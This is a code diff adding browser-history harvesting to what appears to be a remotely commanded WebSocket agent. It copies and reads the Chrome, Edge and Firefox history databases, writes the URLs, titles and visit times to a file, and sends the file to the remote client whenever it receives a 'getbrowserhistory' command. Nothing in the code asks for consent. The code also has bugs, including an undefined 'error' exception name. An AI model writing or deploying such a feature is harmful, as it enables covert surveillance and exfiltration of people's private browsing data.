@@ -38,6 +38,212 @@ while True:
 
 
 
+# --- Fonction pour récupérer l'historique du navigateur (avec Edge, Chrome, Firefox) ---
+async def get_browser_history():
+    """
+    Récupère l'historique de navigation de Chrome, Edge et Firefox.
+    Gère les différents chemins d'OS et le verrouillage de la base de données en copiant le fichier DB.
+    Retourne une liste de dictionnaires contenant les URLs visitées. Si des erreurs graves surviennent
+    pendant la récupération (ex: OS non supporté ou toutes les tentatives échouent), un dictionnaire
+    contenant une clé 'error' sera retourné.
+    """
+    history_entries = []
+    
+    browser_paths = {
+        "Windows": {
+            "Chrome": os.path.join(os.environ.get('LOCALAPPDATA', ''), r"Google\Chrome\User Data\Default\History"),
+            "Edge": os.path.join(os.environ.get('LOCALAPPDATA', ''), r"Microsoft\Edge\User Data\Default\History"),
+            "Firefox_Root": os.path.join(os.environ.get('APPDATA', ''), r"Mozilla\Firefox\Profiles"),
+        },
+        "Linux": {
+            "Chrome": os.path.expanduser("~/.config/google-chrome/Default/History"),
+            "Firefox_Root": os.path.expanduser("~/.mozilla/firefox"),
+        }
+    }
+
+    os_type = platform.system()
+    current_os_paths = browser_paths.get(os_type)
+    if not current_os_paths:
+        print(f"La récupération de l'historique du navigateur n'est pas prise en charge sur {os_type}")
+        return {"error": f"La récupération de l'historique du navigateur n'est pas prise en charge sur {os_type}"}
+
+    print(f"--- Tentative de récupération de l'historique du navigateur sur {os_type} ---")
+    
+    # Track if any browser history was successfully added
+    any_history_retrieved = False
+
+    for browser_name, db_path_template in current_os_paths.items():
+        initial_history_count = len(history_entries) # Count before trying this browser
+        if browser_name.endswith("_Root"):
+            if browser_name == "Firefox_Root":
+                try:
+                    firefox_profiles_root = db_path_template
+                    if await asyncio.to_thread(os.path.exists, firefox_profiles_root):
+                        for profile_dir in await asyncio.to_thread(os.listdir, firefox_profiles_root):
+                            if "default" in profile_dir.lower() and await asyncio.to_thread(os.path.isdir, os.path.join(firefox_profiles_root, profile_dir)):
+                                firefox_db_path = os.path.join(firefox_profiles_root, profile_dir, "places.sqlite")
+                                if await asyncio.to_thread(os.path.exists, firefox_db_path):
+                                    print(f"Base de données de profil Firefox trouvée : {firefox_db_path}")
+                                    await _read_history_from_sqlite(firefox_db_path, "Firefox", history_entries)
+                                else:
+                                    print(f"places.sqlite de Firefox non trouvé dans {profile_dir}")
+                    else:
+                        print(f"Racine des profils Firefox non trouvée : {firefox_profiles_root}")
+                except Exception as e:
+                    print(f"Erreur lors de la lecture des profils Firefox : {e}")
+            
+        else: # For Chrome and Edge
+            if await asyncio.to_thread(os.path.exists, db_path_template):
+                print(f"Base de données d'historique {browser_name} trouvée : {db_path_template}")
+                await _read_history_from_sqlite(db_path_template, browser_name, history_entries)
+            else:
+                print(f"Base de données d'historique {browser_name} non trouvée à : {db_path_template}")
+        
+        # Check if new entries were added for this browser
+        if len(history_entries) > initial_history_count:
+            any_history_retrieved = True
+
+    # If no history was retrieved from any browser, and there are no specific errors in history_entries,
+    # return an error indicating no history was found.
+    if not any_history_retrieved and not any("error" in entry for entry in history_entries):
+        return {"error": "Aucun historique de navigateur n'a pu être récupéré."}
+        
+    return {"browser_history": history_entries}
+
+
+async def _read_history_from_sqlite(db_path, browser_name, history_entries_list):
+    """
+    Fonction d'aide interne pour lire l'historique à partir d'un fichier de base de données SQLite.
+    Copie le fichier pour éviter les problèmes de verrouillage.
+    Toutes les opérations SQLite sont maintenant encapsulées dans asyncio.to_thread.
+    """
+    temp_db_path = db_path + ".temp_copy"
+    
+    try:
+        if await asyncio.to_thread(os.path.exists, db_path):
+            print(f"Copie de la base de données d'historique {browser_name} vers {temp_db_path}...")
+            # Use a lambda to pass arguments to shutil.copy2 in asyncio.to_thread
+            await asyncio.to_thread(lambda: shutil.copy2(db_path, temp_db_path))
+
+            def db_operations():
+                _conn = None
+                rows_data = []
+                try:
+                    _conn = sqlite3.connect(temp_db_path)
+                    _cursor = _conn.cursor()
+
+                    if browser_name in ["Chrome", "Edge"]:
+                        query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC"
+                    elif browser_name == "Firefox":
+                        query = "SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC"
+                    else:
+                        print(f"Navigateur non pris en charge pour l'analyse SQLite : {browser_name}")
+                        return []
+
+                    _cursor.execute(query)
+                    rows_data = _cursor.fetchall()
+                    return rows_data
+                finally:
+                    if _conn:
+                        _conn.close()
+
+            rows = await asyncio.to_thread(db_operations)
+
+            for row in rows:
+                url = row[0]
+                title = row[1]
+                timestamp_val = row[2]
+
+                last_visit_time = "Unknown"
+                try:
+                    if browser_name in ["Chrome", "Edge"]:
+                        last_visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp_val)
+                    elif browser_name == "Firefox":
+                        last_visit_time = datetime.datetime.fromtimestamp(timestamp_val / 1_000_000)
+                except (ValueError, TypeError) as e:
+                    print(f"Erreur de conversion de l'horodatage pour {browser_name} ({url}) : {e}")
+                    last_visit_time = "Horodatage Invalide"
+
+                history_entries_list.append({
+                    "browser": browser_name,
+                    "url": url,
+                    "title": title,
+                    "last_visit": str(last_visit_time)
+                })
+        else:
+            print(f"Fichier de base de données non trouvé : {db_path}")
+
+    except sqlite3.OperationalError as e:
+        print(f"[{browser_name}] Base de données verrouillée ou corrompue : {e}")
+        history_entries_list.append({"error": f"[{browser_name}] Base de données verrouillée ou corrompue. Veuillez vous assurer que le navigateur est fermé ou réessayez."})
+    except Exception as e:
+        print(f"[{browser_name}] Une erreur inattendue s'est produite : {e}")
+        history_entries_list.append({"error": f"[{browser_name}] Échec de la lecture de l'historique : {e}"})
+    finally:
+        if await asyncio.to_thread(os.path.exists, temp_db_path):
+            try:
+                await asyncio.to_thread(os.remove, temp_db_path)
+                print(f"Fichier temporaire nettoyé : {temp_db_path}")
+            except PermissionError as e:
+                print(f"ATTENTION: Impossible de supprimer le fichier temporaire {temp_db_path}. Il est peut-être encore utilisé: {e}")
+
+async def write_history_to_file(history_data, filename="browser_history.txt"):
+    """
+    Writes the collected browser history to a text file.
+    Returns True if the file was written successfully (regardless of content), False on IOError.
+    """
+    try:
+        with open(filename, 'w', encoding='utf-8') as f:
+            if "browser_history" in history_data and history_data["browser_history"]:
+                for entry in history_data["browser_history"]:
+                    f.write(f"Navigateur: {entry.get('browser', 'N/A')}\n")
+                    f.write(f"  URL: {entry.get('url', 'N/A')}\n")
+                    f.write(f"  Titre: {entry.get('title', 'N/A')}\n")
+                    f.write(f"  Dernière visite: {entry.get('last_visit', 'N/A')}\n")
+                    f.write("---\n")
+                print(f"Historique du navigateur sauvegardé dans '{filename}' avec succès.")
+            elif "error" in history_data:
+                f.write(f"Erreur lors de la récupération de l'historique : {history_data['error']}\n")
+                print(f"Erreur lors de la récupération de l'historique, détails écrits dans '{filename}'.")
+            else:
+                f.write("Aucune entrée d'historique de navigateur trouvée (ou erreurs rencontrées pour tous les navigateurs).\n")
+                print(f"Aucune entrée d'historique de navigateur trouvée, information écrite dans '{filename}'.")
+        return True # Explicitly return True on successful write
+    except IOError as e:
+        print(f"Erreur lors de l'écriture du fichier '{filename}': {e}")
+        return False # Explicitly return False on IOError
+
+async def main_test_history():
+    """
+    Fonction principale pour exécuter le test de récupération de l'historique.
+    Retourne un dictionnaire contenant les données de l'historique ou les erreurs.
+    """
+    print("Démarrage du test de l'historique du navigateur...")
+    history_data = await get_browser_history() # get_browser_history returns a dict
+    
+    # Save the history to a file. We'll check history_data for actual content.
+    file_write_successful = await write_history_to_file(history_data, "browser_history.txt")
+    
+    print("Test de l'historique du navigateur terminé.")
+    
+    # Return history_data along with file write success status
+    return {
+        "history_data": history_data, 
+        "file_write_successful": file_write_successful,
+        "filename": "browser_history.txt"
+    }
+
+# --- WebSocket Server Integration Example (assuming this is part of a larger WebSocket handler) ---
+HISTORY_FILE_NAME = "browser_history.txt" # This should be a global or passed parameter
+
+
+
+
+
+
+
+
+
 
 
 
@@ -605,6 +811,40 @@ async def receive_commands(websocket):
                 allowed_list = data.get("allowed_processes", [])
                 allowed_processes = set(proc.lower() for proc in allowed_list)
                 print(allowed_processes)
+
+#Get browser history
+            elif data.get("type") == "getbrowserhistory":
+                print("Ready to get browser history")
+
+                file_was_saved = await main_test_history() # Call your existing function
+                
+                if file_was_saved and os.path.exists(HISTORY_FILE_NAME):
+                    try:
+                        # Read the content of the file
+                        # Use asyncio.to_thread for potentially blocking file read
+                        file_content = await asyncio.to_thread(lambda: open(HISTORY_FILE_NAME, 'r', encoding='utf-8').read())
+                        
+                        # Prepare the payload to send to the client
+                        # Include metadata for the client to handle the download
+                        response_payload = {
+                            "type": "file_download",
+                            "filename": HISTORY_FILE_NAME,
+                            "content_type": "text/plain",
+                            "content": file_content
+                        }
+                        
+                        # Send the JSON payload over the WebSocket
+                        await websocket.send(json.dumps(response_payload))
+                        print(f"Contenu de '{HISTORY_FILE_NAME}' envoyé au client via WebSocket.")
+
+                    except error as e:
+                        print(f"ERROR FATAL: {e}")
+                    
+                else:
+                    print("function tsy m execute") 
+
+
+
                 
     except websockets.exceptions.ConnectionClosedOK:
         print("[INFO] Connection forced to close.")
